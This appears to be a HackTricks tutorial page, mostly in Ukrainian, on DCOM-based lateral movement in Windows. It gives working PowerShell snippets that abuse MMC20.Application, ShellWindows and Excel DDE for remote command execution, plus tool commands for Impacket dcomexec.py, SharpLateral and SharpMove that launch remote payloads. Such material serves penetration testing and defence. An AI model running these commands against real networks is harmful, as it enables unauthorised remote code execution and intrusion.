# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## MMC20.Application

**Для отримання додаткової інформації про цю техніку перегляньте оригінальний пост за [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM) об'єкти надають цікаву можливість для мережевих взаємодій з об'єктами. Microsoft надає всебічну документацію як для DCOM, так і для Component Object Model (COM), доступну [тут для DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) та [тут для COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Список DCOM додатків можна отримати за допомогою команди PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM об'єкт, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), дозволяє сценарне управління операціями MMC snap-in. Зокрема, цей об'єкт містить метод `ExecuteShellCommand` під `Document.ActiveView`. Більше інформації про цей метод можна знайти [тут](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Перевірте його роботу:

Ця функція полегшує виконання команд через мережу за допомогою DCOM додатку. Для взаємодії з DCOM віддалено як адміністратор можна використовувати PowerShell наступним чином:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ця команда підключається до DCOM-додатку та повертає екземпляр COM-об'єкта. Потім можна викликати метод ExecuteShellCommand для виконання процесу на віддаленому хості. Процес включає наступні кроки:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Отримати RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Для отримання додаткової інформації про цю техніку перегляньте оригінальний пост [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Об'єкт **MMC20.Application** був виявлений без явних "LaunchPermissions", за замовчуванням надаючи права, які дозволяють доступ адміністраторам. Для отримання додаткових деталей можна дослідити тему [тут](https://twitter.com/tiraniddo/status/817532039771525120), і рекомендується використовувати [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET для фільтрації об'єктів без явного дозволу на запуск.

Два конкретні об'єкти, `ShellBrowserWindow` і `ShellWindows`, були виділені через відсутність явних дозволів на запуск. Відсутність запису `LaunchPermission` у реєстрі під `HKCR:\AppID\{guid}` означає відсутність явних дозволів.

### ShellWindows

Для `ShellWindows`, який не має ProgID, методи .NET `Type.GetTypeFromCLSID` і `Activator.CreateInstance` полегшують створення об'єкта, використовуючи його AppID. Цей процес використовує OleView .NET для отримання CLSID для `ShellWindows`. Після створення об'єкта можливе взаємодія через метод `WindowsShell.Item`, що призводить до виклику методів, таких як `Document.Application.ShellExecute`.

Приклади команд PowerShell були надані для створення об'єкта та виконання команд віддалено:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)

# Need to upload the file to execute
$COM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.APPLICATION", "192.168.52.100"))
$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $Null, $Null, "7")
```
### Lateral Movement with Excel DCOM Objects

Бічний рух може бути досягнутий шляхом експлуатації DCOM об'єктів Excel. Для детальної інформації рекомендується прочитати обговорення про використання Excel DDE для бічного руху через DCOM на [блоці Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Проект Empire надає скрипт PowerShell, який демонструє використання Excel для віддаленого виконання коду (RCE) шляхом маніпуляції об'єктами DCOM. Нижче наведені фрагменти зі скрипту, доступного на [GitHub репозиторії Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), що демонструють різні методи зловживання Excel для RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Automation Tools for Lateral Movement

Два інструменти виділені для автоматизації цих технік:

- **Invoke-DCOM.ps1**: A PowerShell script provided by the Empire project that simplifies the invocation of different methods for executing code on remote machines. This script is accessible at the Empire GitHub repository.

- **SharpLateral**: A tool designed for executing code remotely, which can be used with the command:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Автоматизовані інструменти

- Скрипт Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) дозволяє легко викликати всі коментовані способи виконання коду на інших машинах.
- Ви можете використовувати `dcomexec.py` з Impacket для виконання команд на віддалених системах за допомогою DCOM.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
```
- Ви також можете використовувати [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Ви також можете використовувати [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Посилання

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{{#include ../../banners/hacktricks-training.md}}
